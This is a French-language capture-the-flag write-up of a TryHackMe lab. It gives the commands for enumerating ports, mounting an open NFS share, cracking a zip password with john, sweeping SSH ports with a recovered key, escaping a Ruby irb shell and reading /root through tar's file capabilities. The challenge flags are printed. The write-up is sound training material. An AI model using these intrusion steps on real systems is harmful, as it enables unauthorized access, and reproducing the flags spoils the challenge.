# The Server From Hell #

## Task 1 Hacking the server ##

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo sh -c "echo '10.10.162.156 serverfromhell.thm' >> /etc/hosts"
[sudo] Mot de passe de tim : 
```

Le nous dit :
Start at port 1337 and enumerate your way.
Good luck.

```bash
tim@kali:~/Bureau/tryhackme/write-up$ telnet serverfromhell.thm 1337
Trying 10.10.162.156...
Connected to serverfromhell.thm.
Escape character is '^]'.
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
Try printing the banners from the portsConnection closed by foreign host.
```

On nous dit de scanner les 100 premiers ports.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ rm x
tim@kali:~/Bureau/tryhackme/write-up$ for i in {1..100}; do (sleep 1; echo "get /") | telnet serverfromhell.thm  $i | grep 550 >> x ; done
...
...

tim@kali:~/Bureau/tryhackme/write-up$ cat x 
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff00
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff00
550 12345 0ffffffffff80000088808000000888800000008887ffffffffff00
550 12345 0fffffffff70000088800888800088888800008800007ffffffff00
550 12345 0fffffffff000088808880000000000000088800000008fffffff00
550 12345 0ffffffff80008808880000000880000008880088800008ffffff00
550 12345 0ffffffff000000888000000000800000080000008800007fffff00
550 12345 0fffffff8000000000008888000000000080000000000007fffff00
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff00
550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff00
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff00
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff00
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff00
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf00
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf00
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff00
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff00
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff00
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff00
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff00
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff00
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff00
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff00
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff00
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff00
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff00
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff00
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff00
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff00
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff00
550 12345 0fffffffffffffff800888880000000000000000000800800cfff00
550 12345 0fffffffffffffffff70008878800000000000008878008007fff00
550 12345 0fffffffffffffffffff700008888800000000088000080007fff00
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff00
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff00
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff00
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff00
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff00
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff00
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
550 12345 0000000000000000000000000000000000000000000000000000000
```

On récupérant toute les chaîne on obtient une tête de troll et un numéro de port 12345.   

```bash
tim@kali:~/Bureau/tryhackme/write-up$ telnet serverfromhell.thm 12345
Trying 10.10.162.156...
Connected to serverfromhell.thm.
Escape character is '^]'.
NFS shares are cool, especially when they are misconfigured
It's on the standard port, no need for another scanConnection closed by foreign host.
```

On regarde le port 12345.   
Un message nous dit qu'il y a un partage NFS mal configuré.  

```bash
tim@kali:~/Bureau/tryhackme/write-up$ showmount -e serverfromhell.thm 
Export list for serverfromhell.thm:
/home/nfs *
```

On remarque un partage nfs, qui partage le répertoire /home/nfs.    

```bash
tim@kali:~/Bureau/tryhackme/write-up$ sudo mount -t nfs serverfromhell.thm:/home/nfs /tmp/nfs
[sudo] Mot de passe de tim : 
tim@kali:~/Bureau/tryhackme/write-up$ cd /tmp/nfs/

tim@kali:/tmp/nfs$ ls -al
total 16
drwxr-xr-x  2 nobody nogroup 4096 16 sept.  2020 .
drwxrwxrwt 22 root   root    4096 13 sept. 16:11 ..
-rw-r--r--  1 root   root    4534 16 sept.  2020 backup.zip

tim@kali:/tmp/nfs$ cp ./backup.zip /tmp/

tim@kali:/tmp/nfs$ cd ..
tim@kali:/tmp$ unzip backup.zip 
Archive:  backup.zip
   creating: home/hades/.ssh/
[backup.zip] home/hades/.ssh/id_rsa password: 
   skipping: home/hades/.ssh/id_rsa  incorrect password
   skipping: home/hades/.ssh/hint.txt  incorrect password
   skipping: home/hades/.ssh/authorized_keys  incorrect password
   skipping: home/hades/.ssh/flag.txt  incorrect password
   skipping: home/hades/.ssh/id_rsa.pub  incorrect password

```

On monte le répertoire partagé dans /tmp/nfs
Une fois dans le répertoire partagé on trouve un fichier backup.zip
On essaye de le décompresser, ça ne fonctionne pas il faut un mot de passe.   

```bash
tim@kali:/tmp$ zip2john backup.zip > hash
backup.zip/home/hades/.ssh/ is not encrypted!
ver 1.0 backup.zip/home/hades/.ssh/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa PKZIP Encr: 2b chk, TS_chk, cmplen=2107, decmplen=3369, crc=6F72D66B
ver 1.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/hint.txt PKZIP Encr: 2b chk, TS_chk, cmplen=22, decmplen=10, crc=F51A7381
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/authorized_keys PKZIP Encr: 2b chk, TS_chk, cmplen=602, decmplen=736, crc=1C4C509B
ver 1.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=45, decmplen=33, crc=2F9682FA
ver 2.0 efh 5455 efh 7875 backup.zip/home/hades/.ssh/id_rsa.pub PKZIP Encr: 2b chk, TS_chk, cmplen=602, decmplen=736, crc=1C4C509B
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

tim@kali:/tmp$ john hash -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zxcvbnm          (backup.zip)
1g 0:00:00:00 DONE (2021-09-13 16:18) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

On casse  le mot de passe de l'archive avec john.   
Le mot de passe est : zxcvbnm  

**flag.txt**


```bash
tim@kali:~/Bureau/tryhackme/write-up$ cp /tmp/nfs/backup.zip ./
tim@kali:~/Bureau/tryhackme/write-up$ unzip backup.zip 
Archive:  backup.zip
   creating: home/hades/.ssh/
[backup.zip] home/hades/.ssh/id_rsa password: 
  inflating: home/hades/.ssh/id_rsa  
 extracting: home/hades/.ssh/hint.txt  
  inflating: home/hades/.ssh/authorized_keys  
 extracting: home/hades/.ssh/flag.txt  
  inflating: home/hades/.ssh/id_rsa.pub  

tim@kali:~/Bureau/tryhackme/write-up$ cd ./home/hades/.ssh/
tim@kali:~/Bureau/tryhackme/write-up/home/hades/.ssh$ cat flag.txt 
thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}
```

On décompresse la fichier backup.zip.  
On trouve un fichier flag.txt on le lit.    
La réponse est : thm{h0p3_y0u_l1k3d_th3_f1r3w4ll}    


**user.txt**
```bash
tim@kali:~/Bureau/tryhackme/write-up/home/hades/.ssh$ cat hint.txt
2500-4500

tim@kali:~/Bureau/tryhackme/write-up/home/hades/.ssh$ chmod 700 id_rsa

while true ; do ssh -i id_rsa hades@serverfromhell.thm -p `echo -n $((2500 + SRANDOM % 2000))` ; done
...

tim@kali:~/Bureau/tryhackme/write-up/home/hades/.ssh$ for i in {2500..4500}; do ssh -i id_rsa hades@serverfromhell.thm -p $i ; done 
...
kex_exchange_identification: read: Connection reset by peer
Connection reset by 10.10.162.156 port 3332
The authenticity of host '[serverfromhell.thm]:3333 ([10.10.162.156]:3333)' can't be established.
ECDSA key fingerprint is SHA256:xT5f2qKwN5vWrUVIEkkL92j1vcb/XjF9tIHoW/vyyx8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[serverfromhell.thm]:3333,[10.10.162.156]:3333' (ECDSA) to the list of known hosts.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


 ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░   ░  ░    ░  ░    ░  ░
                               
 Welcome to hell. We hope you enjoy your stay!
 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


 ██░ ██ ▓█████  ██▓     ██▓    
▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒██▀▀██░▒███   ▒██░    ▒██░    
░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▓█▒░██▓░▒████▒░██████▒░██████▒
 ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
 ░  ░░ ░   ░     ░ ░     ░ ░   
 ░  ░  ░   ░  ░    ░  ░    ░  ░
                               
 Welcome to hell. We hope you enjoy your stay!
 irb(main):001:0> 
...
```

La méthode aléatoire est prend trop de temps.   
Avec la méthode séquenciel on trouve le port et on a un shell.   

```bash
 irb(main):001:0> exec '/bin/bash'
```

On est dans un shell interactif en ruby.   
On lui dit d'exécuter un shell.  

```bash
hades@hell:~$ cat user.txt
thm{sh3ll_3c4p3_15_v3ry_1337}
```

On trouve un fichier user.txt   
On le lit et on a notre flag.   
La réponse est : thm{sh3ll_3c4p3_15_v3ry_1337}     

**root.txt**


```bash
hades@hell:~$ getcap -r / 2>/dev/null
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep

hades@hell:~$ cd /tmp
hades@hell:/tmp$ /bin/tar -cvf root.tar /root/
/bin/tar: Removing leading `/' from member names
/root/
/root/.gnupg/
/root/.gnupg/private-keys-v1.d/
/root/.bashrc
/root/root.txt
/root/.bash_history
/root/.ssh/
/root/.ssh/authorized_keys
/root/.cache/
/root/.cache/motd.legal-displayed
/root/.profile

hades@hell:/tmp$ tar -xvf root.tar
root/
root/.gnupg/
root/.gnupg/private-keys-v1.d/
root/.bashrc
root/root.txt
root/.bash_history
root/.ssh/
root/.ssh/authorized_keys
root/.cache/
root/.cache/motd.legal-displayed
root/.profile

hades@hell:/tmp$ cd root/
hades@hell:/tmp/root$ cat  root.txt 
thm{w0w_n1c3_3sc4l4t10n}
```

On recherche les fichiers qui ont des capabilities.    
On trouve /bin/tar qui peut lire les fichiers même en root.   
On archive le répertoire root dans tmp.    
On extrait l'archive dans tmp.    
On trouve un fichier root.txt et on le lit.  

La réponse est : thm{w0w_n1c3_3sc4l4t10n}  
